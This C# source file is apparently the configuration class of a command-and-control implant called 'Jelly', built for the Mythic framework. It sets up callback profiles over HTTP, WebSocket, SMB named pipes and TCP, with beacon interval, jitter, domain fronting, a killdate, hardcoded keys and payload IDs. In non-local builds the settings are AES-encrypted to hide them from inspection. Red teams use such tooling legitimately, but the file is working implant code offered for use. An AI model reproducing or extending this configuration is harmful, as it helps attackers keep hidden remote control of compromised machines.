#define C2PROFILE_NAME_UPPER

//#define LOCAL_BUILD

#if LOCAL_BUILD
//#define HTTP
//#define WEBSOCKET
//#define TCP
//#define SMB
#endif

#if HTTP
using HttpTransport;
#endif
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using Interop.Structs.Structs;
using PSKCryptography;
using Interop.Serializers;
#if WEBSOCKET
using WebsocketTransport;
#endif
#if SMB
using NamedPipeTransport;
#endif
#if TCP
using TcpTransport;
#endif
namespace Jelly
{
    public static class Config
    {
        // Encryption key - change this to a random value
        private static readonly byte[] _encryptionKey = new byte[] 
        { 
            0x7a, 0x4d, 0x1b, 0x8e, 0x3c, 0x9f, 0x2d, 0x5a, 
            0x6b, 0x1e, 0x4f, 0x9c, 0x2a, 0x7d, 0x3b, 0x8c,
            0x5e, 0x1a, 0x6f, 0x4d, 0x2c, 0x9b, 0x3d, 0x7a,
            0x1c, 0x8f, 0x5b, 0x2e, 0x6d, 0x4a, 0x9e, 0x3f
        };

        private static string DecryptString(string encryptedBase64)
        {
            try
            {
                byte[] encryptedData = Convert.FromBase64String(encryptedBase64);
                using (Aes aes = Aes.Create())
                {
                    aes.Key = _encryptionKey;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    byte[] iv = new byte[aes.IV.Length];
                    Array.Copy(encryptedData, 0, iv, 0, iv.Length);
                    aes.IV = iv;
                    
                    using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                    {
                        byte[] decryptedData = decryptor.TransformFinalBlock(encryptedData, iv.Length, encryptedData.Length - iv.Length);
                        return Encoding.UTF8.GetString(decryptedData);
                    }
                }
            }
            catch
            {
                return encryptedBase64;
            }
        }
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "callback_interval", "1" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://192.168.53.1" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Jelly-Refactor" },
#else
                        { "callback_interval", DecryptString("http_callback_interval_encrypted_here") },
                        { "callback_jitter", DecryptString("http_callback_jitter_encrypted_here") },
                        { "callback_port", DecryptString("http_callback_port_encrypted_here") },
                        { "callback_host", DecryptString("http_callback_host_encrypted_here") },
                        { "post_uri", DecryptString("http_post_uri_encrypted_here") },
                        { "encrypted_exchange_check", DecryptString("http_encrypted_exchange_check_encrypted_here") },
                        { "proxy_host", DecryptString("http_proxy_host_encrypted_here") },
                        { "proxy_port", DecryptString("http_proxy_port_encrypted_here") },
                        { "proxy_user", DecryptString("http_proxy_user_encrypted_here") },
                        { "proxy_pass", DecryptString("http_proxy_pass_encrypted_here") },
                        { "killdate", DecryptString("http_killdate_encrypted_here") },
#endif
                    }
                }
            },
#endif
#if WEBSOCKET
            { "websocket", new C2ProfileData()
                {
                    TC2Profile = typeof(WebsocketProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "tasking_type", "Push" },
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "8081" },
                        { "callback_host", "ws://mythic" },
                        { "ENDPOINT_REPLACE", "socket" },
                        { "encrypted_exchange_check", "T" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Jelly-Refactor" },
#else
                        { "tasking_type", DecryptString("websocket_tasking_type_encrypted_here")},
                        { "callback_interval", DecryptString("websocket_callback_interval_encrypted_here") },
                        { "callback_jitter", DecryptString("websocket_callback_jitter_encrypted_here") },
                        { "callback_port", DecryptString("websocket_callback_port_encrypted_here") },
                        { "callback_host", DecryptString("websocket_callback_host_encrypted_here") },
                        { "ENDPOINT_REPLACE", DecryptString("websocket_ENDPOINT_REPLACE_encrypted_here") },
                        { "encrypted_exchange_check", DecryptString("websocket_encrypted_exchange_check_encrypted_here") },
                        { "domain_front", DecryptString("websocket_domain_front_encrypted_here") },
                        { "USER_AGENT", DecryptString("websocket_USER_AGENT_encrypted_here") },
                        { "killdate", DecryptString("websocket_killdate_encrypted_here") },
#endif
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "pipename", "h20iexte-2l1t-mmfu-ipjh-6ofmobkaruq8" },
                        { "encrypted_exchange_check", "true" },
#else
                        { "pipename", DecryptString("smb_pipename_encrypted_here") },
                        { "encrypted_exchange_check", DecryptString("smb_encrypted_exchange_check_encrypted_here") },
#endif
                    }
                }
            },
#elif TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "port", "40000" },
                        { "encrypted_exchange_check", "true" },
#else
                        { "port", DecryptString("tcp_port_encrypted_here") },
                        { "encrypted_exchange_check", DecryptString("tcp_encrypted_exchange_check_encrypted_here") },
#endif
                    }
                }
            }
#endif
        };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if LOCAL_BUILD
#if HTTP
        public static string StagingRSAPrivateKey = "wkskVa0wTi4E3EZ6bi9YyKpbHb01NNDgZ1BXnJJM5io=";
#elif WEBSOCKET
        public static string StagingRSAPrivateKey = "Hl3IzCYy3io5QU70xjpYyCNrOmA84aWMZLkCwumrAFM=";
#elif SMB
        public static string StagingRSAPrivateKey = "NNLlAegRMB8DIX7EZ1Yb6UlKQ4la90QsisIThCyhfCc=";
#elif TCP
        public static string StagingRSAPrivateKey = "Zq24zZvWPRGdWwEQ79JXcHunzvcOJaKLH7WtR+gLiGg=";
#endif
#if HTTP
        public static string PayloadUUID = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
#elif WEBSOCKET
        public static string PayloadUUID = "7546e204-aae4-42df-b28a-ade1c13594d2";
#elif SMB
        public static string PayloadUUID = "aff94490-1e23-4373-978b-263d9c0a47b3";
#elif TCP
        public static string PayloadUUID = "bfc167ea-9142-4da3-b807-c57ae054c544";
#endif
#else
        public static string StagingRSAPrivateKey => DecryptString("aes_psk_encrypted_here");
        public static string PayloadUUID => DecryptString("payload_uuid_encrypted_here");
#endif
    }
}
